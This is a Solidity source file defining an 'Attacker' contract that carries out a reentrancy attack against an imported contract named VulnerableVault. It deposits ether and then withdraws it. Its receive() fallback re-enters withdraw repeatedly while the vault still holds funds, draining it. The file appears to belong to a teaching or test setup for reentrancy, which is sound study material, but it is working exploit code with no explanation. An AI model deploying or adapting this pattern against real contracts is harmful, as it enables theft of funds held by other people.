// SPDX-License-Identifier: MIT
pragma solidity ^0.8.23;

import "./VulnerableVault.sol";

contract Attacker {
    VulnerableVault public target;
    uint256 public drainAmount;

    constructor(address targetVault) {
        target = VulnerableVault(targetVault);
    }

    receive() external payable {
        if (address(target).balance >= drainAmount) {
            target.withdraw(drainAmount);
        }
    }

    function attack(uint256 amount) external payable {
        require(msg.value >= amount, "fund attacker first");
        drainAmount = amount;

        target.deposit{value: amount}();
        target.withdraw(amount);
    }
}
